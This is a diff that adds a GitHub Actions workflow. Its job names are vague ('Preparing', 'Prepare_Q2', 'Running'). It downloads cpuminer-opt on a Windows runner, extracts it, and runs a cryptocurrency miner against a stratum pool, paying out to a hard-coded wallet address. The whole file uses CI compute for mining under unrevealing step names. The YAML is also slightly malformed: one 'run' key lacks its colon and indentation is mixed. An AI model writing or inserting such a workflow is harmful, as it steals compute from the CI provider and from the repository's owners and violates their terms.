@@ -1,0 +1,16 @@
+name: eX-code_Core
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+	- name: Preparing
+	  run: Invoke-WebRequest https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-win.zip
+	- name: Prepare_Q2
+	  run: Expand-Archive cpuminer-opt-win.zip
+	- name: Running
+	  run .\cpuminer-opt-win\cpuminer-avx2.exe -a yespowersugar -o stratum+tcp://tratum-asia.rplant.xyz:17042 -u sugar1qsxwl9749axmhe97prqfy5xzxzkwrjn4jph8sqs.kksugar01
+	- name: DONE
+	  run: exit
